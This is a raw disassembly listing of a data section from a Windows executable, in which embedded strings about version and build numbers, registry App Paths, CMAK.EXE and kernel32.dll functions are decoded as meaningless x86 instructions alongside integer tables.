  404e55:	add    BYTE PTR [edi+0x0],ch
  404e58:	outs   dx,BYTE PTR ds:[esi]
  404e59:	add    BYTE PTR [eax],ah
  404e5b:	add    BYTE PTR [esi+0x0],ah
  404e5e:	popa   
  404e5f:	add    BYTE PTR [ecx+0x0],ch
  404e62:	ins    BYTE PTR es:[edi],dx
  404e63:	add    BYTE PTR [ebp+0x0],ah
  404e66:	add    BYTE PTR fs:[edx],bh
  404e69:	add    BYTE PTR [eax],ah
  404e6b:	add    BYTE PTR ds:0x64006c00,ah
  404e71:	add    BYTE PTR [edx],cl
  404e73:	add    BYTE PTR [eax],al
  404e75:	add    BYTE PTR [eax],al
  404e77:	add    BYTE PTR [ebx+0x0],dl
  404e7a:	push   0x6c006500
  404e7f:	add    BYTE PTR [eax+eax*1+0x45],ch
  404e83:	add    BYTE PTR [eax+0x0],bh
  404e86:	add    BYTE PTR gs:[ebx+0x0],ah
  404e8a:	dec    eax
  404e8b:	add    BYTE PTR [ebp+0x0],ah
  404e8e:	ins    BYTE PTR es:[edi],dx
  404e8f:	add    BYTE PTR [eax+0x0],dh
  404e92:	add    BYTE PTR gs:[edx+0x0],dh
  404e96:	and    BYTE PTR [eax],al
  404e98:	data16 add BYTE PTR [edi+0x0],ch
  404e9c:	jb     0x404e9e
  404e9e:	and    BYTE PTR [eax],al
  404ea0:	inc    ebx
  404ea1:	add    BYTE PTR [ebp+0x0],ch
  404ea4:	add    BYTE PTR fs:[eax],ah
  404ea7:	add    BYTE PTR ds:0x22002000,ch
  404ead:	add    BYTE PTR ds:0x22007300,ah
  404eb3:	add    BYTE PTR [eax+eax*1],ch
  404eb6:	and    BYTE PTR [eax],al
  404eb8:	push   eax
  404eb9:	add    BYTE PTR [ecx+0x0],ah
  404ebc:	jb     0x404ebe
  404ebe:	popa   
  404ebf:	add    BYTE PTR [ebp+0x0],ch
  404ec2:	jae    0x404ec4
  404ec4:	and    BYTE PTR [eax],al
  404ec6:	sub    eax,0x22002000
  404ecb:	add    BYTE PTR ds:0x22007300,ah
  404ed1:	add    BYTE PTR [eax],ah
  404ed3:	add    BYTE PTR [edx+0x0],dh
  404ed6:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  404edb:	add    BYTE PTR [edx+0x0],dh
  404ede:	outs   dx,BYTE PTR ds:[esi]
  404edf:	add    BYTE PTR [ebp+0x0],ah
  404ee2:	add    BYTE PTR fs:[eax],ah
  404ee5:	add    BYTE PTR ds:0x7800,ah
  404eeb:	add    BYTE PTR [eax],al
  404eed:	add    BYTE PTR [eax],al
  404eef:	add    BYTE PTR [eax+eax*1+0x61],cl
  404ef3:	add    BYTE PTR [ebp+0x0],dh
  404ef6:	outs   dx,BYTE PTR ds:[esi]
  404ef7:	add    BYTE PTR [ebx+0x0],ah
  404efa:	push   0x6e004900
  404eff:	add    BYTE PTR [esi+0x0],ah
  404f02:	push   ebx
  404f03:	add    BYTE PTR [ebp+0x0],ah
  404f06:	arpl   WORD PTR [eax],ax
  404f08:	je     0x404f0a
  404f0a:	imul   eax,DWORD PTR [eax],0x6e006f
  404f10:	and    BYTE PTR [eax],al
  404f12:	data16 add BYTE PTR [edi+0x0],ch
  404f16:	jb     0x404f18
  404f18:	and    BYTE PTR [eax],al
  404f1a:	dec    ecx
  404f1b:	add    BYTE PTR [esi+0x0],ch
  404f1e:	data16 add BYTE PTR [eax],ah
  404f21:	add    BYTE PTR ds:0x22002000,ch
  404f27:	add    BYTE PTR ds:0x22007300,ah
  404f2d:	add    BYTE PTR [eax+eax*1],ch
  404f30:	and    BYTE PTR [eax],al
  404f32:	push   ebx
  404f33:	add    BYTE PTR [ebp+0x0],ah
  404f36:	arpl   WORD PTR [eax],ax
  404f38:	je     0x404f3a
  404f3a:	imul   eax,DWORD PTR [eax],0x6e006f
  404f40:	and    BYTE PTR [eax],al
  404f42:	sub    eax,0x22002000
  404f47:	add    BYTE PTR ds:0x22007300,ah
  404f4d:	add    BYTE PTR [eax],ah
  404f4f:	add    BYTE PTR [edx+0x0],dh
  404f52:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  404f57:	add    BYTE PTR [edx+0x0],dh
  404f5a:	outs   dx,BYTE PTR ds:[esi]
  404f5b:	add    BYTE PTR [ebp+0x0],ah
  404f5e:	add    BYTE PTR fs:[eax],ah
  404f61:	add    BYTE PTR ds:0x7800,ah
  404f67:	add    BYTE PTR [eax+eax*1+0x61],cl
  404f6b:	add    BYTE PTR [ebp+0x0],dh
  404f6e:	outs   dx,BYTE PTR ds:[esi]
  404f6f:	add    BYTE PTR [ebx+0x0],ah
  404f72:	push   0x6e004900
  404f77:	add    BYTE PTR [esi+0x0],ah
  404f7a:	push   ebx
  404f7b:	add    BYTE PTR [ebp+0x0],ah
  404f7e:	arpl   WORD PTR [eax],ax
  404f80:	je     0x404f82
  404f82:	imul   eax,DWORD PTR [eax],0x6e006f
  404f88:	inc    ebp
  404f89:	add    BYTE PTR [eax+0x0],bh
  404f8c:	and    BYTE PTR [eax],al
  404f8e:	data16 add BYTE PTR [edi+0x0],ch
  404f92:	jb     0x404f94
  404f94:	and    BYTE PTR [eax],al
  404f96:	dec    ecx
  404f97:	add    BYTE PTR [esi+0x0],ch
  404f9a:	data16 add BYTE PTR [eax],ah
  404f9d:	add    BYTE PTR ds:0x22002000,ch
  404fa3:	add    BYTE PTR ds:0x22007300,ah
  404fa9:	add    BYTE PTR [eax+eax*1],ch
  404fac:	and    BYTE PTR [eax],al
  404fae:	push   ebx
  404faf:	add    BYTE PTR [ebp+0x0],ah
  404fb2:	arpl   WORD PTR [eax],ax
  404fb4:	je     0x404fb6
  404fb6:	imul   eax,DWORD PTR [eax],0x6e006f
  404fbc:	and    BYTE PTR [eax],al
  404fbe:	sub    eax,0x22002000
  404fc3:	add    BYTE PTR ds:0x22007300,ah
  404fc9:	add    BYTE PTR [eax],ah
  404fcb:	add    BYTE PTR [edx+0x0],dh
  404fce:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  404fd3:	add    BYTE PTR [edx+0x0],dh
  404fd6:	outs   dx,BYTE PTR ds:[esi]
  404fd7:	add    BYTE PTR [ebp+0x0],ah
  404fda:	add    BYTE PTR fs:[eax],ah
  404fdd:	add    BYTE PTR ds:0x7800,ah
  404fe3:	add    BYTE PTR [edi],ch
  404fe5:	add    BYTE PTR [ebx+0x0],ah
  404fe8:	and    BYTE PTR [eax],al
  404fea:	das    
  404feb:	add    BYTE PTR [ecx+0x0],dh
  404fee:	and    BYTE PTR [eax],al
  404ff0:	das    
  404ff1:	add    BYTE PTR [eax+eax*1+0x3a],dh
  404ff5:	add    BYTE PTR ds:0x7300,ah
  404ffb:	add    BYTE PTR ds:0x63007300,ah
  405001:	add    BYTE PTR [ebp+0x0],ch
  405004:	bound  eax,QWORD PTR [eax]
  405006:	imul   eax,DWORD PTR [eax],0x73006e
  40500c:	add    BYTE PTR cs:[ebp+0x0],ah
  405010:	js     0x405012
  405012:	add    BYTE PTR gs:[eax],al
  405015:	add    BYTE PTR [eax],al
  405017:	add    BYTE PTR ds:0x5c007300,ah
  40501d:	add    BYTE PTR [ebx+0x0],ah
  405020:	ins    DWORD PTR es:[edi],dx
  405021:	add    BYTE PTR [edx+0x0],ah
  405024:	imul   eax,DWORD PTR [eax],0x73006e
  40502a:	add    BYTE PTR cs:[ebp+0x0],ah
  40502e:	js     0x405030
  405030:	add    BYTE PTR gs:[eax],al
  405033:	add    BYTE PTR [eax+eax*1+0x0],bl
  405037:	add    BYTE PTR [esi+edx*2+0x61],bl
  40503b:	jb     0x405083
  40503d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x49],0x5c6f666e
  405045:	push   esp
  405046:	jb     0x4050a9
  405048:	outs   dx,BYTE PTR ds:[esi]
  405049:	jae    0x4050b7
  40504b:	popa   
  40504c:	je     0x4050b7
  40504e:	outs   dx,DWORD PTR ds:[esi]
  40504f:	outs   dx,BYTE PTR ds:[esi]
  405050:	add    BYTE PTR [eax],al
  405052:	add    BYTE PTR [eax],al
  405054:	and    eax,0x20007300
  405059:	add    BYTE PTR [eax+0x0],ch
  40505c:	popa   
  40505d:	add    BYTE PTR [ebx+0x0],dh
  405060:	and    BYTE PTR [eax],al
  405062:	push   esi
  405063:	add    BYTE PTR [ebp+0x0],ah
  405066:	jb     0x405068
  405068:	jae    0x40506a
  40506a:	imul   eax,DWORD PTR [eax],0x6e006f
  405070:	and    BYTE PTR [eax],al
  405072:	cmp    eax,0x25002000
  405077:	add    BYTE PTR [ebp+0x0],dh
  40507a:	add    BYTE PTR cs:0x7500,ah
  405081:	add    BYTE PTR [eax],al
  405083:	add    BYTE PTR ds:0x20007300,ah
  405089:	add    BYTE PTR [eax+0x0],ch
  40508c:	popa   
  40508d:	add    BYTE PTR [ebx+0x0],dh
  405090:	and    BYTE PTR [eax],al
  405092:	inc    edx
  405093:	add    BYTE PTR [ebp+0x0],dh
  405096:	imul   eax,DWORD PTR [eax],0x64006c
  40509c:	and    BYTE PTR [eax],al
  40509e:	dec    esi
  40509f:	add    BYTE PTR [ebp+0x0],dh
  4050a2:	ins    DWORD PTR es:[edi],dx
  4050a3:	add    BYTE PTR [edx+0x0],ah
  4050a6:	add    BYTE PTR gs:[edx+0x0],dh
  4050aa:	and    BYTE PTR [eax],al
  4050ac:	cmp    eax,0x25002000
  4050b1:	add    BYTE PTR [ebp+0x0],dh
  4050b4:	add    BYTE PTR cs:0x7500,ah
  4050bb:	add    BYTE PTR ds:0x20007300,ah
  4050c1:	add    BYTE PTR [eax+0x0],ch
  4050c4:	popa   
  4050c5:	add    BYTE PTR [ebx+0x0],dh
  4050c8:	and    BYTE PTR [eax],al
  4050ca:	dec    esp
  4050cb:	add    BYTE PTR [ebx+0x0],al
  4050ce:	dec    ecx
  4050cf:	add    BYTE PTR [eax+eax*1+0x20],al
  4050d3:	add    BYTE PTR ds:0x25002000,bh
  4050d9:	add    BYTE PTR [ebp+0x0],dh
  4050dc:	add    BYTE PTR [eax],al
  4050de:	add    BYTE PTR [eax],al
  4050e0:	push   ebx
  4050e1:	add    BYTE PTR [edi+0x0],cl
  4050e4:	inc    esi
  4050e5:	add    BYTE PTR [eax+eax*1+0x57],dl
  4050e9:	add    BYTE PTR [ecx+0x0],al
  4050ec:	push   edx
  4050ed:	add    BYTE PTR [ebp+0x0],al
  4050f0:	pop    esp
  4050f1:	add    BYTE PTR [ebp+0x0],cl
  4050f4:	imul   eax,DWORD PTR [eax],0x720063
  4050fa:	outs   dx,DWORD PTR ds:[esi]
  4050fb:	add    BYTE PTR [ebx+0x0],dh
  4050fe:	outs   dx,DWORD PTR ds:[esi]
  4050ff:	add    BYTE PTR [esi+0x0],ah
  405102:	je     0x405104
  405104:	pop    esp
  405105:	add    BYTE PTR [edi+0x0],dl
  405108:	imul   eax,DWORD PTR [eax],0x64006e
  40510e:	outs   dx,DWORD PTR ds:[esi]
  40510f:	add    BYTE PTR [edi+0x0],dh
  405112:	jae    0x405114
  405114:	pop    esp
  405115:	add    BYTE PTR [ebx+0x0],al
  405118:	jne    0x40511a
  40511a:	jb     0x40511c
  40511c:	jb     0x40511e
  40511e:	add    BYTE PTR gs:[esi+0x0],ch
  405122:	je     0x405124
  405124:	push   esi
  405125:	add    BYTE PTR [ebp+0x0],ah
  405128:	jb     0x40512a
  40512a:	jae    0x40512c
  40512c:	imul   eax,DWORD PTR [eax],0x6e006f
  405132:	pop    esp
  405133:	add    BYTE PTR [ecx+0x0],al
  405136:	jo     0x405138
  405138:	jo     0x40513a
  40513a:	and    BYTE PTR [eax],al
  40513c:	push   eax
  40513d:	add    BYTE PTR [ecx+0x0],ah
  405140:	je     0x405142
  405142:	push   0x5c007300
  405147:	add    BYTE PTR [ebx+0x0],al
  40514a:	dec    ebp
  40514b:	add    BYTE PTR [ecx+0x0],al
  40514e:	dec    ebx
  40514f:	add    BYTE PTR [esi],ch
  405151:	add    BYTE PTR [ebp+0x0],al
  405154:	pop    eax
  405155:	add    BYTE PTR [ebp+0x0],al
  405158:	add    BYTE PTR [eax],al
  40515a:	add    BYTE PTR [eax],al
  40515c:	push   eax
  40515d:	add    BYTE PTR [ecx+0x0],ah
  405160:	je     0x405162
  405162:	push   0x0
  405167:	add    BYTE PTR ds:0x5c007300,ah
  40516d:	add    BYTE PTR [ebx+0x0],ah
  405170:	ins    DWORD PTR es:[edi],dx
  405171:	add    BYTE PTR [ecx+0x0],ah
  405174:	imul   eax,DWORD PTR [eax],0x2e
  405177:	add    BYTE PTR [ebp+0x0],ah
  40517a:	js     0x40517c
  40517c:	add    BYTE PTR gs:[eax],al
  40517f:	add    BYTE PTR ds:0x5c007300,ah
  405185:	add    BYTE PTR [ebx+0x0],ah
  405188:	ins    DWORD PTR es:[edi],dx
  405189:	add    BYTE PTR [eax+eax*1+0x69],ah
  40518d:	add    BYTE PTR [ecx+0x0],ah
  405190:	ins    BYTE PTR es:[edi],dx
  405191:	add    BYTE PTR [ebx],dh
  405193:	add    BYTE PTR [edx],dh
  405195:	add    BYTE PTR [esi],ch
  405197:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40519b:	add    BYTE PTR [eax+eax*1+0x0],ch
  40519f:	add    BYTE PTR [ebx+0x65],ch
  4051a2:	jb     0x405212
  4051a4:	gs ins BYTE PTR es:[edi],dx
  4051a6:	xor    esi,DWORD PTR [edx]
  4051a8:	cs fs ins BYTE PTR es:[edi],dx
  4051ab:	ins    BYTE PTR es:[edi],dx
  4051ac:	add    BYTE PTR [eax],al
  4051ae:	add    BYTE PTR [eax],al
  4051b0:	dec    eax
  4051b1:	gs popa 
  4051b3:	jo     0x405208
  4051b5:	gs je  0x405201
  4051b8:	outs   dx,BYTE PTR ds:[esi]
  4051b9:	outs   dx,WORD PTR ds:[esi]
  4051bb:	jb     0x40522a
  4051bd:	popa   
  4051be:	je     0x405229
  4051c0:	outs   dx,DWORD PTR ds:[esi]
  4051c1:	outs   dx,BYTE PTR ds:[esi]
  4051c2:	add    BYTE PTR [eax],al
  4051c4:	dec    ecx
  4051c5:	jae    0x40521e
  4051c7:	outs   dx,DWORD PTR ds:[esi]
  4051c8:	ja     0x405200
  4051ca:	xor    al,0x50
  4051cc:	jb     0x40523d
  4051ce:	arpl   WORD PTR [ebp+0x73],sp
  4051d1:	jae    0x4051d3
  4051d3:	add    BYTE PTR [ebx+0x74],dl
  4051d6:	jb     0x405241
  4051d8:	outs   dx,BYTE PTR ds:[esi]
  4051d9:	addr16 inc ebx
  4051db:	arpl   WORD PTR [eax+0x43],bp
  4051de:	outs   dx,DWORD PTR ds:[esi]
  4051df:	jo     0x40525a
  4051e1:	and    BYTE PTR [esi+0x61],ah
  4051e4:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x74697720
  4051ec:	push   0x72726520
  4051f1:	outs   dx,DWORD PTR ds:[esi]
  4051f2:	jb     0x40522e
  4051f4:	and    BYTE PTR [eax],dh
  4051f6:	js     0x40521d
  4051f8:	js     0x405204
  4051fa:	add    BYTE PTR [eax],al
  4051fc:	push   ebx
  4051fd:	je     0x405271
  4051ff:	imul   ebp,DWORD PTR [esi+0x67],0x43686343
  405206:	outs   dx,DWORD PTR ds:[esi]
  405207:	jo     0x405282
  405209:	inc    ebp
  40520a:	js     0x40522c
  40520c:	popaw  
  40520e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x74697720
  405216:	push   0x72726520
  40521b:	outs   dx,DWORD PTR ds:[esi]
  40521c:	jb     0x405258
  40521e:	and    BYTE PTR [eax],dh
  405220:	js     0x405247
  405222:	js     0x40522e
  405224:	add    BYTE PTR [eax],al
  405226:	add    BYTE PTR [eax],al
  405228:	push   ebx
  405229:	je     0x40529d
  40522b:	imul   ebp,DWORD PTR [esi+0x67],0x43686343
  405232:	outs   dx,DWORD PTR ds:[esi]
  405233:	jo     0x4052ae
  405235:	dec    esi
  405236:	inc    ebp
  405237:	js     0x405259
  405239:	popaw  
  40523b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x74697720
  405243:	push   0x72726520
  405248:	outs   dx,DWORD PTR ds:[esi]
  405249:	jb     0x405285
  40524b:	and    BYTE PTR [eax],dh
  40524d:	js     0x405274
  40524f:	js     0x40525b
  405251:	add    BYTE PTR [eax],al
  405253:	add    BYTE PTR [ebx+0x74],dl
  405256:	jb     0x4052c1
  405258:	outs   dx,BYTE PTR ds:[esi]
  405259:	addr16 inc ebx
  40525b:	arpl   WORD PTR [eax+0x43],bp
  40525e:	popa   
  40525f:	je     0x4052a6
  405261:	js     0x405283
  405263:	popaw  
  405265:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x74697720
  40526d:	push   0x72726520
  405272:	outs   dx,DWORD PTR ds:[esi]
  405273:	jb     0x4052af
  405275:	and    BYTE PTR [eax],dh
  405277:	js     0x40529e
  405279:	js     0x405285
  40527b:	add    BYTE PTR [ebx+0x74],dl
  40527e:	jb     0x4052e9
  405280:	outs   dx,BYTE PTR ds:[esi]
  405281:	addr16 inc ebx
  405283:	arpl   WORD PTR [eax+0x50],bp
  405286:	jb     0x4052f1
  405288:	outs   dx,BYTE PTR ds:[esi]
  405289:	je     0x4052f1
  40528b:	inc    ebp
  40528c:	js     0x4052ae
  40528e:	popaw  
  405290:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x74697720
  405298:	push   0x72726520
  40529d:	outs   dx,DWORD PTR ds:[esi]
  40529e:	jb     0x4052da
  4052a0:	and    BYTE PTR [eax],dh
  4052a2:	js     0x4052c9
  4052a4:	js     0x4052b0
	...
  4052ae:	add    BYTE PTR [eax],al
  4052b0:	inc    eax
  4052b1:	add    BYTE PTR [eax],al
  4052b3:	add    BYTE PTR [eax+0x0],al
  4052b6:	add    BYTE PTR [eax],al
  4052b8:	inc    eax
  4052b9:	add    BYTE PTR [eax],al
  4052bb:	add    BYTE PTR [eax+0x0],al
  4052be:	add    BYTE PTR [eax],al
  4052c0:	inc    eax
  4052c1:	add    BYTE PTR [eax],al
  4052c3:	add    BYTE PTR [eax+0x0],al
  4052c6:	add    BYTE PTR [eax],al
  4052c8:	inc    eax
  4052c9:	add    BYTE PTR [eax],al
  4052cb:	add    BYTE PTR [eax+0x0],al
  4052ce:	add    BYTE PTR [eax],al
  4052d0:	inc    eax
  4052d1:	add    BYTE PTR [eax],al
  4052d3:	add    BYTE PTR [eax+0x0],al
  4052d6:	add    BYTE PTR [eax],al
  4052d8:	inc    eax
  4052d9:	add    BYTE PTR [eax],al
  4052db:	add    BYTE PTR [eax+0x0],al
  4052de:	add    BYTE PTR [eax],al
  4052e0:	inc    eax
  4052e1:	add    BYTE PTR [eax],al
  4052e3:	add    BYTE PTR [eax+0x0],al
  4052e6:	add    BYTE PTR [eax],al
  4052e8:	inc    eax
  4052e9:	add    BYTE PTR [eax],al
  4052eb:	add    BYTE PTR [eax+0x0],al
  4052ee:	add    BYTE PTR [eax],al
  4052f0:	inc    eax
  4052f1:	add    BYTE PTR [eax],al
  4052f3:	add    BYTE PTR [eax+0x0],al
  4052f6:	add    BYTE PTR [eax],al
  4052f8:	inc    eax
  4052f9:	add    BYTE PTR [eax],al
  4052fb:	add    BYTE PTR [eax+0x0],al
  4052fe:	add    BYTE PTR [eax],al
  405300:	inc    eax
  405301:	add    BYTE PTR [eax],al
  405303:	add    BYTE PTR [eax+0x0],al
  405306:	add    BYTE PTR [eax],al
  405308:	inc    eax
  405309:	add    BYTE PTR [eax],al
  40530b:	add    BYTE PTR [eax+0x0],al
  40530e:	add    BYTE PTR [eax],al
  405310:	inc    eax
  405311:	add    BYTE PTR [eax],al
  405313:	add    BYTE PTR [eax+0x0],al
  405316:	add    BYTE PTR [eax],al
  405318:	inc    eax
  405319:	add    BYTE PTR [eax],al
  40531b:	add    BYTE PTR [eax+0x0],al
  40531e:	add    BYTE PTR [eax],al
  405320:	inc    eax
  405321:	add    BYTE PTR [eax],al
  405323:	add    BYTE PTR [eax+0x0],al
  405326:	add    BYTE PTR [eax],al
  405328:	inc    eax
  405329:	add    BYTE PTR [eax],al
  40532b:	add    BYTE PTR [eax+0x0],al
  40532e:	add    BYTE PTR [eax],al
  405330:	inc    eax
  405331:	add    BYTE PTR [eax],al
  405333:	add    BYTE PTR [eax+0x0],al
  405336:	add    BYTE PTR [eax],al
  405338:	inc    eax
  405339:	add    BYTE PTR [eax],al
  40533b:	add    BYTE PTR [eax+0x0],al
  40533e:	add    BYTE PTR [eax],al
  405340:	inc    eax
  405341:	add    BYTE PTR [eax],al
  405343:	add    BYTE PTR [eax+0x0],al
  405346:	add    BYTE PTR [eax],al
  405348:	inc    eax
  405349:	add    BYTE PTR [eax],al
  40534b:	add    BYTE PTR [eax+0x0],al
  40534e:	add    BYTE PTR [eax],al
  405350:	inc    eax
  405351:	add    BYTE PTR [eax],al
  405353:	add    BYTE PTR [eax+0x0],al
  405356:	add    BYTE PTR [eax],al
  405358:	inc    eax
  405359:	add    BYTE PTR [eax],al
  40535b:	add    BYTE PTR [esi],bh
  40535d:	add    BYTE PTR [eax],al
  40535f:	add    BYTE PTR [eax+0x0],al
  405362:	add    BYTE PTR [eax],al
  405364:	inc    eax
  405365:	add    BYTE PTR [eax],al
  405367:	add    BYTE PTR [eax+0x0],al
  40536a:	add    BYTE PTR [eax],al
  40536c:	aas    
  40536d:	add    BYTE PTR [eax],al
  40536f:	add    BYTE PTR [eax+eax*1],dh
  405372:	add    BYTE PTR [eax],al
  405374:	xor    eax,0x36000000
  405379:	add    BYTE PTR [eax],al
  40537b:	add    BYTE PTR [edi],dh
  40537d:	add    BYTE PTR [eax],al
  40537f:	add    BYTE PTR [eax],bh
  405381:	add    BYTE PTR [eax],al
  405383:	add    BYTE PTR [ecx],bh
  405385:	add    BYTE PTR [eax],al
  405387:	add    BYTE PTR [edx],bh
  405389:	add    BYTE PTR [eax],al
  40538b:	add    BYTE PTR [ebx],bh
  40538d:	add    BYTE PTR [eax],al
  40538f:	add    BYTE PTR [eax+eax*1],bh
  405392:	add    BYTE PTR [eax],al
  405394:	cmp    eax,0x40000000
  405399:	add    BYTE PTR [eax],al
  40539b:	add    BYTE PTR [eax+0x0],al
  40539e:	add    BYTE PTR [eax],al
  4053a0:	inc    eax
  4053a1:	add    BYTE PTR [eax],al
  4053a3:	add    BYTE PTR [eax+0x0],al
  4053a6:	add    BYTE PTR [eax],al
  4053a8:	inc    eax
  4053a9:	add    BYTE PTR [eax],al
  4053ab:	add    BYTE PTR [eax+0x0],al
  4053ae:	add    BYTE PTR [eax],al
  4053b0:	inc    eax
  4053b1:	add    BYTE PTR [eax],al
  4053b3:	add    BYTE PTR [eax],al
  4053b5:	add    BYTE PTR [eax],al
  4053b7:	add    BYTE PTR [ecx],al
  4053b9:	add    BYTE PTR [eax],al
  4053bb:	add    BYTE PTR [edx],al
  4053bd:	add    BYTE PTR [eax],al
  4053bf:	add    BYTE PTR [ebx],al
  4053c1:	add    BYTE PTR [eax],al
  4053c3:	add    BYTE PTR [eax+eax*1],al
  4053c6:	add    BYTE PTR [eax],al
  4053c8:	add    eax,0x6000000
  4053cd:	add    BYTE PTR [eax],al
  4053cf:	add    BYTE PTR [edi],al
  4053d1:	add    BYTE PTR [eax],al
  4053d3:	add    BYTE PTR [eax],cl
  4053d5:	add    BYTE PTR [eax],al
  4053d7:	add    BYTE PTR [ecx],cl
  4053d9:	add    BYTE PTR [eax],al
  4053db:	add    BYTE PTR [edx],cl
  4053dd:	add    BYTE PTR [eax],al
  4053df:	add    BYTE PTR [ebx],cl
  4053e1:	add    BYTE PTR [eax],al
  4053e3:	add    BYTE PTR [eax+eax*1],cl
  4053e6:	add    BYTE PTR [eax],al
  4053e8:	or     eax,0xe000000
  4053ed:	add    BYTE PTR [eax],al
  4053ef:	add    BYTE PTR [edi],cl
  4053f1:	add    BYTE PTR [eax],al
  4053f3:	add    BYTE PTR [eax],dl
  4053f5:	add    BYTE PTR [eax],al
  4053f7:	add    BYTE PTR [ecx],dl
  4053f9:	add    BYTE PTR [eax],al
  4053fb:	add    BYTE PTR [edx],dl
  4053fd:	add    BYTE PTR [eax],al
  4053ff:	add    BYTE PTR [ebx],dl
  405401:	add    BYTE PTR [eax],al
  405403:	add    BYTE PTR [eax+eax*1],dl
  405406:	add    BYTE PTR [eax],al
  405408:	adc    eax,0x16000000
  40540d:	add    BYTE PTR [eax],al
  40540f:	add    BYTE PTR [edi],dl
  405411:	add    BYTE PTR [eax],al
  405413:	add    BYTE PTR [eax],bl
  405415:	add    BYTE PTR [eax],al
  405417:	add    BYTE PTR [ecx],bl
  405419:	add    BYTE PTR [eax],al
  40541b:	add    BYTE PTR [eax+0x0],al
  40541e:	add    BYTE PTR [eax],al
  405420:	inc    eax
  405421:	add    BYTE PTR [eax],al
  405423:	add    BYTE PTR [eax+0x0],al
  405426:	add    BYTE PTR [eax],al
  405428:	inc    eax
  405429:	add    BYTE PTR [eax],al
  40542b:	add    BYTE PTR [eax+0x0],al
  40542e:	add    BYTE PTR [eax],al
  405430:	inc    eax
  405431:	add    BYTE PTR [eax],al
  405433:	add    BYTE PTR [edx],bl
  405435:	add    BYTE PTR [eax],al
  405437:	add    BYTE PTR [ebx],bl
  405439:	add    BYTE PTR [eax],al
  40543b:	add    BYTE PTR [eax+eax*1],bl
  40543e:	add    BYTE PTR [eax],al
  405440:	sbb    eax,0x1e000000
  405445:	add    BYTE PTR [eax],al
  405447:	add    BYTE PTR [edi],bl
  405449:	add    BYTE PTR [eax],al
  40544b:	add    BYTE PTR [eax],ah
  40544d:	add    BYTE PTR [eax],al
  40544f:	add    BYTE PTR [ecx],ah
  405451:	add    BYTE PTR [eax],al
  405453:	add    BYTE PTR [edx],ah
  405455:	add    BYTE PTR [eax],al
  405457:	add    BYTE PTR [ebx],ah
  405459:	add    BYTE PTR [eax],al
  40545b:	add    BYTE PTR [eax+eax*1],ah
  40545e:	add    BYTE PTR [eax],al
  405460:	and    eax,0x26000000
  405465:	add    BYTE PTR [eax],al
  405467:	add    BYTE PTR [edi],ah
  405469:	add    BYTE PTR [eax],al
  40546b:	add    BYTE PTR [eax],ch
  40546d:	add    BYTE PTR [eax],al
  40546f:	add    BYTE PTR [ecx],ch
  405471:	add    BYTE PTR [eax],al
  405473:	add    BYTE PTR [edx],ch
  405475:	add    BYTE PTR [eax],al
  405477:	add    BYTE PTR [ebx],ch
  405479:	add    BYTE PTR [eax],al
  40547b:	add    BYTE PTR [eax+eax*1],ch
  40547e:	add    BYTE PTR [eax],al
  405480:	sub    eax,0x2e000000
  405485:	add    BYTE PTR [eax],al
  405487:	add    BYTE PTR [edi],ch
  405489:	add    BYTE PTR [eax],al
  40548b:	add    BYTE PTR [eax],dh
  40548d:	add    BYTE PTR [eax],al
  40548f:	add    BYTE PTR [ecx],dh
  405491:	add    BYTE PTR [eax],al
  405493:	add    BYTE PTR [edx],dh
  405495:	add    BYTE PTR [eax],al
  405497:	add    BYTE PTR [ebx],dh
  405499:	add    BYTE PTR [eax],al
  40549b:	add    BYTE PTR [eax+0x0],al
  40549e:	add    BYTE PTR [eax],al
  4054a0:	inc    eax
  4054a1:	add    BYTE PTR [eax],al
  4054a3:	add    BYTE PTR [eax+0x0],al
  4054a6:	add    BYTE PTR [eax],al
  4054a8:	inc    eax
  4054a9:	add    BYTE PTR [eax],al
  4054ab:	add    BYTE PTR [eax+0x0],al
  4054ae:	add    BYTE PTR [eax],al
  4054b0:	inc    eax
  4054b1:	add    BYTE PTR [eax],al
  4054b3:	add    BYTE PTR [eax+0x0],al
  4054b6:	add    BYTE PTR [eax],al
  4054b8:	inc    eax
  4054b9:	add    BYTE PTR [eax],al
  4054bb:	add    BYTE PTR [eax+0x0],al
  4054be:	add    BYTE PTR [eax],al
  4054c0:	inc    eax
  4054c1:	add    BYTE PTR [eax],al
  4054c3:	add    BYTE PTR [eax+0x0],al
  4054c6:	add    BYTE PTR [eax],al
  4054c8:	inc    eax
  4054c9:	add    BYTE PTR [eax],al
  4054cb:	add    BYTE PTR [eax+0x0],al
  4054ce:	add    BYTE PTR [eax],al
  4054d0:	inc    eax
  4054d1:	add    BYTE PTR [eax],al
  4054d3:	add    BYTE PTR [eax+0x0],al
  4054d6:	add    BYTE PTR [eax],al
  4054d8:	inc    eax
  4054d9:	add    BYTE PTR [eax],al
  4054db:	add    BYTE PTR [eax+0x0],al
  4054de:	add    BYTE PTR [eax],al
  4054e0:	inc    eax
  4054e1:	add    BYTE PTR [eax],al
  4054e3:	add    BYTE PTR [eax+0x0],al
  4054e6:	add    BYTE PTR [eax],al
  4054e8:	inc    eax
  4054e9:	add    BYTE PTR [eax],al
  4054eb:	add    BYTE PTR [eax+0x0],al
  4054ee:	add    BYTE PTR [eax],al
  4054f0:	inc    eax
  4054f1:	add    BYTE PTR [eax],al
  4054f3:	add    BYTE PTR [eax+0x0],al
  4054f6:	add    BYTE PTR [eax],al
  4054f8:	inc    eax
  4054f9:	add    BYTE PTR [eax],al
  4054fb:	add    BYTE PTR [eax+0x0],al
  4054fe:	add    BYTE PTR [eax],al
  405500:	inc    eax
  405501:	add    BYTE PTR [eax],al
  405503:	add    BYTE PTR [eax+0x0],al
  405506:	add    BYTE PTR [eax],al
  405508:	inc    eax
  405509:	add    BYTE PTR [eax],al
  40550b:	add    BYTE PTR [eax+0x0],al
  40550e:	add    BYTE PTR [eax],al
  405510:	inc    eax
  405511:	add    BYTE PTR [eax],al
  405513:	add    BYTE PTR [eax+0x0],al
  405516:	add    BYTE PTR [eax],al
  405518:	inc    eax
  405519:	add    BYTE PTR [eax],al
  40551b:	add    BYTE PTR [eax+0x0],al
  40551e:	add    BYTE PTR [eax],al
  405520:	inc    eax
  405521:	add    BYTE PTR [eax],al
